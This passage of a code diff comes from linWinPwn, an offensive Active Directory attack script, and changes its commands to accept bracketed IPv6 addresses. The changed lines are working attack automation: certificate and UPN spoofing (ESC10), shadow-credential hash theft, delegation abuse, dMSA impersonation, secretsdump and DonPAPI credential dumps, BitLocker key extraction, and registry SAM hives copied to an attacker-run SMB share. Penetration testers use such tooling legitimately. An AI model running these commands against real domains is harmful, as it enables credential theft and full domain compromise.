                         echo -e "\n${GREEN}[+] Authenticate using ccache of impersonated Admin:${NC}"
-                        echo -e "linWinPwn -t ${dc_ip} -d ${domain} -u '${value_upn}' -K '${Credentials_dir}/${value_upn//\$/}.ccache'"
+                        echo -e "linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${value_upn}' -K '${Credentials_dir}/${value_upn//\$/}.ccache'"
                         echo -e "_OR_"
                         echo -e "export KRB5CCNAME='${Credentials_dir}/${value_upn//\$/}.ccache'"
                         echo -e "ksu ${value_upn}"
@@ -4514,7 +4554,7 @@ add_upn_esc10() {
             if [ -z "$target_upn_hash" ]; then
                 if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
                 echo -e "${BLUE}[*] BloodyAD Retrieve Hash via ShadowCreds...${NC}"
-                run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+                run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
                 target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
             fi
             if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then 
@@ -4532,20 +4572,20 @@ add_upn_esc10() {
                 if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
                 if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
                 if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
-                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 echo -e "${BLUE}[*] Requesting certificate permitting client authentication for ${target_upn}.${NC}"
                 pki_server=$(echo -e "$pki_servers" | sed 's/ /\n/g' | sed -n ${1}p)
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${1}p)
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
                 if [ "${kerb_bool}" == true ]; then krb_upn="KRB5CCNAME=''"; krb_param="-k"; else krb_upn=""; krb_param=""; fi
-                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param}  ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip_bracket} -ns ${dc_ip_bracket} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param}  ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 cd "${current_dir}" || exit
                 echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn} back to original value.${NC}"
-                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
                 if stat "${Credentials_dir}/${value_upn//\$/}.pfx" >/dev/null 2>&1; then
                     echo -e "\n${GREEN}[+] Authenticate using pfx of impersonated Admin or DC:${NC}"
-                    echo -e "${certipy} auth -pfx ${Credentials_dir}/${value_upn//\$/}.pfx -dc-ip ${dc_ip} ${ldaps_param} [-ldap-shell]"
+                    echo -e "${certipy} auth -pfx ${Credentials_dir}/${value_upn//\$/}.pfx -dc-ip ${dc_ip_bracket} ${ldaps_param} [-ldap-shell]"
                 fi
             fi
         fi
@@ -4571,7 +4611,7 @@ add_constrained() {
                 read -rp ">> " target_consdeleg </dev/tty
             done
             echo -e "${CYAN}[*] Adding Constrained Delegation rights to ${target_consdeleg}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4595,7 +4635,7 @@ add_spn_constrained() {
                 read -rp ">> " target_spn </dev/tty
             done
             echo -e "${CYAN}[*] Adding DC HOST and LDAP SPNs to ${target_spn}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"
             if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}"
                 echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
@@ -4633,7 +4673,7 @@ badsuccessor_adddmsa() {
             if [[ ! ${imp_dmsa_temp} == "" ]]; then imp_dmsa="${imp_dmsa_temp}"; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
             echo -e "${CYAN}[*] Adding dMSA named ${dmsa_name} to ${target_ou}${NC}"
-            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action add  -dmsa-name '${dmsa_name}' -target-ou '${target_ou}' -target-account '${target_dmsa}' -principals-allowed '${imp_dmsa}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_adddmsa_${user_var}.txt"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} ${ldaps_param} -action add  -dmsa-name '${dmsa_name}' -target-ou '${target_ou}' -target-account '${target_dmsa}' -principals-allowed '${imp_dmsa}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_adddmsa_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -4659,7 +4699,7 @@ badsuccessor_deletedmsa() {
             if [[ ! ${dmsa_name_delete} == "" ]]; then dmsa_name="${dmsa_name_delete}"; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
             echo -e "${CYAN}[*] Removing dMSA named ${dmsa_name} from ${target_ou}${NC}"
-            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action delete -dmsa-name '${dmsa_name}' -target-ou '${target_ou}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_deletedmsa_${user_var}.txt"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} ${ldaps_param} -action delete -dmsa-name '${dmsa_name}' -target-ou '${target_ou}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_deletedmsa_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -4715,7 +4755,7 @@ secrets_dump() {
         else
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
-                run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${Credentials_dir}/secretsdump_${user_var}_${i}.txt"
+                run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip_bracket}" | tee "${Credentials_dir}/secretsdump_${user_var}_${i}.txt"
             done
         fi
     fi
@@ -4732,12 +4772,13 @@ samsystem_dump() {
         else
             set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
+            # impacket smbserver -ip does not bind IPv6; IPv4-only upstream
             echo -e "${impacket_smbserver} -ip ${attacker_IP} -smb2support lwpshare ${Credentials_dir}/"
             read -rp "" </dev/tty
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p "${Credentials_dir}/SAMDump_${user_var}/${i}"
-                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\${attacker_IP}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
+                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip_bracket} backup -o \\\\\\${attacker_IP_bracket}\\lwpshare\\SAMDump_${user_var}\\$i" | tee "${Credentials_dir}/SAMDump_${user_var}/regsave_${dc_domain}_${i}.txt"
             done
         fi
     fi
@@ -4873,7 +4914,7 @@ donpapi_dump() {
         else
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
-                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_${dc_domain}_${i}.txt"
+                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip_bracket}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_${dc_domain}_${i}.txt"
             done
         fi
     fi
@@ -4891,7 +4932,7 @@ donpapi_noreg_dump() {
         else
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
-                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -nr -t ${i} --dc-ip ${dc_ip}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_nr_${dc_domain}_${i}.txt"
+                run_command "${donpapi} -o ${Credentials_dir}/DonPAPI collect ${argument_donpapi} -nr -t ${i} --dc-ip ${dc_ip_bracket}" | tee "${Credentials_dir}/DonPAPI_${user_var}/DonPAPI_nr_${dc_domain}_${i}.txt"
             done
         fi
     fi
@@ -4908,7 +4949,7 @@ hekatomb_dump() {
         else
             current_dir=$(pwd)
             cd "${Credentials_dir}" || exit
-            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dns_ip} -smb2 -csv" | tee "${Credentials_dir}/hekatomb_${user_var}.txt"
+            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip_bracket} -dns ${dns_ip} -smb2 -csv" | tee "${Credentials_dir}/hekatomb_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -4924,7 +4965,7 @@ bitlocker_dump() {
             echo -e "${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}"
         else
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${Credentials_dir}/bitlockerdump_${user_var}_output_${dc_domain}.txt"
+            run_command "${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip_bracket}" 2>&1 | tee "${Credentials_dir}/bitlockerdump_${user_var}_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -5251,7 +5292,7 @@ print_info() {
     fi
     echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
-    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
+    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip_bracket}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}, KRB ${dc_port_88}, RDP ${dc_port_3389}, WinRM ${dc_port_5985}"
     echo -e "${YELLOW}[i]${NC} DNS Server's IP: ${YELLOW}${dns_ip}${NC}"
     echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
@@ -5472,15 +5513,23 @@ set_attackerIP() {
     attacker_IP=""
     read -rp ">> " attacker_IP </dev/tty
 
-    while [[ -z "${attacker_IP}" ]]; do
+    while [[ -z "${attacker_IP}" ]] || ! is_valid_ip "${attacker_IP}"; do
         if [[ -z "${attacker_IP}" ]]; then
             echo -e "${RED}Empty input.${NC}"
+        else
+            echo -e "${RED}Invalid IP.${NC} Please specify a valid IPv4 or IPv6 address."
         fi
-        if [[ -z "${attacker_IP}" ]]; then
-            echo -e "${RED}Invalid IP.${NC} Please specify your attacker's IP."
-            read -rp ">> " attacker_IP </dev/tty
-        fi
+        read -rp ">> " attacker_IP </dev/tty
     done
+
+    if [[ "$attacker_IP" == *:* ]]; then
+        attacker_IPv6="$attacker_IP"
+        attacker_IPv4=""
+    else
+        attacker_IPv4="$attacker_IP"
+        attacker_IPv6=""
+    fi
+    attacker_IP_bracket=$(bracket_ip "$attacker_IP")
 }
 
 pkinit_auth() {
@@ -5488,11 +5537,11 @@ pkinit_auth() {
     current_dir=$(pwd)
     cd "${Credentials_dir}" || exit
     if [[ "${pfxpass}" == "" ]]; then
-        run_command "${certipy} auth -pfx '${pfxcert}' -dc-ip ${dc_ip} -username '${user}' -domain ${domain} ${ldaps_param}" | tee "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
+        run_command "${certipy} auth -pfx '${pfxcert}' -dc-ip ${dc_ip_bracket} -username '${user}' -domain ${domain} ${ldaps_param}" | tee "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
     else
         echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
         run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out '${user}_unprotected.pfx'" | tee "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
-        run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain} ${ldaps_param}" | tee -a "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
+        run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip_bracket} -username '${user}' -domain ${domain} ${ldaps_param}" | tee -a "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
     fi
     hash=$(grep "Got hash for" "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt" | cut -d ":" -f 2,3 | cut -d " " -f 2 | tr -d '[:space:]')
     if [[ ! -z "${hash}" ]]; then
@@ -6188,7 +6237,7 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "${impacket_getST} ${argument_imp} -dc-ip ${dc_ip} -spn ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
+                run_command "${impacket_getST} ${argument_imp} -dc-ip ${dc_ip_bracket} -spn ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
                 ticket_ccache_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                 if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
@@ -6364,7 +6413,7 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "${impacket_getST} ${argument_imp} -self -impersonate ${tick_randuser} -dc-ip ${dc_ip} -altservice ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
+                run_command "${impacket_getST} ${argument_imp} -self -impersonate ${tick_randuser} -dc-ip ${dc_ip_bracket} -altservice ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
                 ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                 if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
@@ -6523,7 +6572,7 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip}"
+                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip_bracket}"
                 ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                 if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
@@ -6559,7 +6608,7 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip}"
+                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip_bracket}"
                 ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                 if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
@@ -6608,7 +6657,7 @@ kerberos_menu() {
                 echo -e "${CYAN}[*] Requesting dMSA impersonation ticket${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "KRB5CCNAME=${krb_ticket}.ccache ${impacket_getST} ${domain}/${user}@${dc_FQDN} -k -no-pass -dc-ip ${dc_ip} -impersonate '${dmsa_account}$' -self -dmsa" | tee -a "${Credentials_dir}/getST_dmsa_output_${user_var}"
+                run_command "KRB5CCNAME=${krb_ticket}.ccache ${impacket_getST} ${domain}/${user}@${dc_FQDN} -k -no-pass -dc-ip ${dc_ip_bracket} -impersonate '${dmsa_account}$' -self -dmsa" | tee -a "${Credentials_dir}/getST_dmsa_output_${user_var}"
                 ticket_ccache_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.ccache"
                 ticket_kirbi_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.kirbi"
                 if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
@@ -7538,7 +7587,7 @@ auth_menu() {
         done
         hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$pass_hash_gen") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
         echo -e "${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}"
-        echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}"
+        echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -H ${hash_gen}"
         auth_menu
         ;;
 
@@ -7560,7 +7609,7 @@ auth_menu() {
             if [[ "${john_out}" == *"1 password"* ]]; then
                 password_cracked=$(echo "$john_out" | head -n 1 | cut -d ":" -f 2 | cut -d " " -f 1)
                 echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
-                echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -p ${password_cracked}"
             else
                 echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
             fi
@@ -7583,7 +7632,7 @@ auth_menu() {
             aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
             if [[ ! "${aes_key}" == "" ]]; then
                 echo -e "${GREEN}[+] AES Keys generated:${NC}\n${aes_gen}"
-                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -A ${aes_key}"
             elif [ "${noexec_bool}" == "false" ]; then
                 echo -e "${RED}[-] Error generating AES Keys${NC}"
             fi
@@ -7598,7 +7647,7 @@ auth_menu() {
             run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --kdcHost ${dc_FQDN} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
             if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                 echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
-                echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
             elif [ "${noexec_bool}" == "false" ]; then
                 echo -e "${RED}[-] Failed to generate TGT${NC}"
             fi
@@ -7625,7 +7674,7 @@ auth_menu() {
                     if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
                     if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                         if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
+                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip_bracket} -ns ${dc_ip_bracket} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
                     done
                     cd "${current_dir}" || exit
                 else
@@ -7640,7 +7689,7 @@ auth_menu() {
                         pem_cert="${Credentials_dir}/${user}.pem"
                         echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'"
                     fi
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn -t ${dc_ip_bracket} -d ${domain} -u '${user}' -C '${pfxcert}'"
                 elif [ "${noexec_bool}" == "false" ]; then
                     echo -e "${RED}[-] Failed to request certificate${NC}"
                 fi
